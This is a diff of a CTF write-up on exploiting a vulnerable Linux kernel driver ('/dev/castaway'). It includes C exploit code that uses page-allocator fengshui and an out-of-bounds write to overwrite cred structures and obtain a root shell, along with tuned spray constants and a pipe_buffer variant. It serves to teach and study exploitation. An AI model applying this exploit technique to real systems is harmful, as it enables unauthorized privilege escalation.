@@ -35,15 +35,16 @@ In the second way, we don't need a leak but a little brute force. I didn't try b
 
 # 0x02 Ideal Senario
 
-We have a vulnerable page next to a cred page. Then we use `edit` to overflow the first 6 bytes of cred then we become root!
+This challenge is easy! We have a vulnerable page next to a cred page. Then we use `edit` to overflow the first 6 bytes of cred then we become root!
 
 Tip: Considering the first 4 bytes for creds is `usage` we'd better overwrite it with non-zero values. In practice, I would like to overwrite it with a large number, such as 0x132, since I found if we set it to 1/0, we may fail on some cases (e.g., when it's 1, we can't seteuid).
 
-However, it's not as simple as the ideal case since noise. They come for two reasons:
-- The cred allocation is not atomic
-- Environment: Fengshui / Noisy background
+But how to get senario is not easy if we don't know the settubf up better Fengshui and avoiding noise.
 
 # 0x05 Exploitation
+
+
+## Page Holes Fengshui
 
 If there is no noisy, it's easy to create one target page next to the vulnerable page. By the following code
 
@@ -60,9 +61,11 @@ for x in range(0x200):
 spray_obj2()
 ```
 
-However, when it's noisy, it's hard to hit. There are two main ways to make it easier to happen: 
+However, when it's noisy, it may not hit. There are two main ways to make it easier to happen: 
 - Spray More
 - Make it less noisy
+
+## Make it less noisy
 
 Since the limit of allocation for both creds and vulnerable objects. We can do little to spray more. We only have a window of about 0x40 pages. In the original write up, the author figured out a way to make it less noisy. 
 
@@ -81,10 +84,103 @@ signal_cache
 pid
 ```
 
+## Details
 
-However, different from the clean allocations, it's still hard to achieve our ideal layout.
+After I reproduced the official solution with the value it provides, I got a root shell. But I was still confused about "how do the author get these numbers?" and tried to modify the number in the script finding these numbers could be computed percisly or I can't get a root shell.
 
-I tried to combine the techniques above but it's still hard. I reproduced the exploit but I still don't quite understand the fengshui.
+
+```c
+nt main(){
+    // shell();
+    libxInit();
+    fd = open("/dev/castaway",2);
+    // Step 1. Drain Creds
+    for(int i = 0 ; i < 800; i++)
+        fork_sleep();
+    // Step 2. Init the SockPageAllocator
+    spaInit();
+    // Step 3. Do page draining
+    for (int i = 0; i < NR_PAGE_DRAINING; i++)
+        spaCmd(ADD, i);
+    // Step 4. Allocate contiguous pages
+    for (int i = NR_PAGE_DRAINING; i < NR_PAGE_DRAINING+NR_CNT_PAGES; i++)
+        spaCmd(ADD, i);
+    // Step 5. Free & Refill
+    for (int i = NR_PAGE_DRAINING; i < NR_PAGE_DRAINING+NR_CNT_PAGES; i+= 2)
+        spaCmd(FREE, i);
+    for(int i = 0 ; i < NR_VUl_TARGETS; i++)
+        add();
+    for (int i = NR_PAGE_DRAINING; i < NR_PAGE_DRAINING+NR_CNT_PAGES; i+= 2)
+        spaCmd(FREE, i+1);
+    for(int i = 0 ; i < NR_CREDS; i++)
+        cloneRoot();
+    
+    // Step 6. OOB Write
+    char *buf = calloc(1,0x200);
+    memset(buf+0x200-6,'\x00',4);
+    memset(buf+0x200-2,'\x00',2);
+    for(int i = 0 ; i < NR_VUl_TARGETS; i++)
+        edit(i,0x200,buf);
+    debug();
+    // Step 7. Wait for the rootShell
+    info("Zz...");
+    debug();
+}
+
+```
+
+Based on the skills we talked, we are able to generate the above exploit. However, how to set the numbers in the exploit to improve the success rate that we get the creds pages just after `vulnerable page` where we can OOB write? 
+
+```c
+#define NR_PAGE_DRAINING ?
+#define NR_CNT_PAGES ?
+#define NR_VUl_TARGETS ?
+#define NR_CREDS ?
+```
+
+
+First, if we want to improve the possibility to hit, we'd better create as many as vulnerable pages as possible. so I set
+
+```c
+#define NR_VUl_TARGETS 0x1f8
+```
+
+Then, considering the limit of `clone` that the more we `clone` the slower the machine is, I set `NR_CREDS` to 0x40 which takes 2-3 second to finish creds spraying.
+
+
+```c
+#define NR_CREDS 0x40 
+```
+
+`NR_PAGE_DRAINING` is also easy to compute. I wrote a kernel module and keep allocating and printing the allocated page addresses. Then I found 0x200 should be a safe number to make sure we can get contiguous pages in the later page allocation.
+
+
+
+```c
+#define NR_PAGE_DRAINING 0x200
+```
+
+At the end, a little math is needed to get `NR_CNT_PAGES`. If you set it too small, the noise may influence more to your attacking. If you set it too large the following case may happen:
+
+- Assuming we have 10 pages `[0...8]`
+- Free the first half so we get the free-list: `[8,4,2,0]`
+- Spray some `object1` to get some pages in free-list, and assuming we still have free-list: `[2,0]`
+- Free the second half so we get the free-list: `[7,5,3,1,2,0]`
+- Spray some `object2` to get pages in free-list
+- The limit spray of `object2` results in that we only get page 7 and 5 from freelist which are not next to the `object1` pages
+
+Therefore, considering we have around 0x40 pages of OOB pages. We should set `NR_CNT_PAGES` to 0x80 and set `object1` to the `vulnerable object` to improve the success rate.
+
+In the end, we have
+
+```c
+#define NR_PAGE_DRAINING 0x200
+#define NR_CNT_PAGES 0x80
+#define NR_VUl_TARGETS 0x1f8
+#define NR_CREDS 0x40
+```
+
+# 0x06 Exploit: OOB to Creds
 
 ```c
 // https://github.com/n132/libx
@@ -176,51 +272,55 @@ int key_alloc(char *description, char *payload, int payload_len)
     return syscall(__NR_add_key,"user", description, payload, payload_len, 
                    KEY_SPEC_PROCESS_KEYRING);
 }
+
+#define NR_PAGE_DRAINING 0x200
+#define NR_CNT_PAGES 0x80
+#define NR_VUl_TARGETS 0x1f8
+#define NR_CREDS 0x40
+
 int main(){
     // shell();
     libxInit();
     fd = open("/dev/castaway",2);
     // Step 1. Drain Creds
-    for(int i = 0 ; i < 200; i++)
+    for(int i = 0 ; i < 800; i++)
         fork_sleep();
     // Step 2. Init the SockPageAllocator
     spaInit();
-    // Step 3. Do drain and leave some pages in memory
-    // Step 4. Spray with target obj/creds
-    for (int i = 0; i < 0x300; i++)
+    // Step 3. Do page draining
+    for (int i = 0; i < NR_PAGE_DRAINING; i++)
         spaCmd(ADD, i);
-    for (int i = 0x280; i < 0x300; i += 2)
+    // Step 4. Allocate contiguous pages
+    for (int i = NR_PAGE_DRAINING; i < NR_PAGE_DRAINING+NR_CNT_PAGES; i++)
+        spaCmd(ADD, i);
+    // Step 5. Free & Refill
+    for (int i = NR_PAGE_DRAINING; i < NR_PAGE_DRAINING+NR_CNT_PAGES; i+= 2)
         spaCmd(FREE, i);
-
-    for(int i = 0 ; i < 0x100; i++)
-        cloneRoot();
-    for (int i = 0x280; i < 0x300; i += 2)
-        spaCmd(FREE, i+1);
-    for(int i = 0 ; i < 0x1f8; i++)
+    for(int i = 0 ; i < NR_VUl_TARGETS; i++)
         add();
-
-
-  
-    // Step 5. OOB Write
+    for (int i = NR_PAGE_DRAINING; i < NR_PAGE_DRAINING+NR_CNT_PAGES; i+= 2)
+        spaCmd(FREE, i+1);
+    for(int i = 0 ; i < NR_CREDS; i++)
+        cloneRoot();
+    
+    // Step 6. OOB Write
     char *buf = calloc(1,0x200);
-    size_t * ptr = buf ; 
-    * ptr = 0xdeadbeefff;
     memset(buf+0x200-6,'\x00',4);
     memset(buf+0x200-2,'\x00',2);
-    for(int i = 0 ; i < 0x1f8;i++)
+    for(int i = 0 ; i < NR_VUl_TARGETS; i++)
         edit(i,0x200,buf);
-
-    // Step 6. Wait for the rootShell
+    debug();
+    // Step 7. Wait for the rootShell
     info("Zz...");
-    sleep(0x1000);
     debug();
 }
+
 ```
 
 
-## Exploit PipeBuffer
+# 0x07 Exploit: OOB to PipeBuffer
 
-Considering that the official solution is hard to understand for me, I exploited it in a way I am more familiar with: `PipeBuffer`.
+When I was struggling with the official write-up Fengshui, I exploited it in a way I am more familiar with: `PipeBuffer`.
 
 
 Each page structure represents one page in the memory. We can get the virtual address of the corresponding page by doing math:
@@ -462,10 +562,10 @@ int main(){
 }
 ```
 
-# Epilogue
+# 0x08 Epilogue
 
 TODO:
-- Figure out fengshui of the official solution
+- [Done] Figure out fengshui of the official solution 
 - Fiugure out why it crashes after run arbitrary commands
 - Learn more page allocation
 
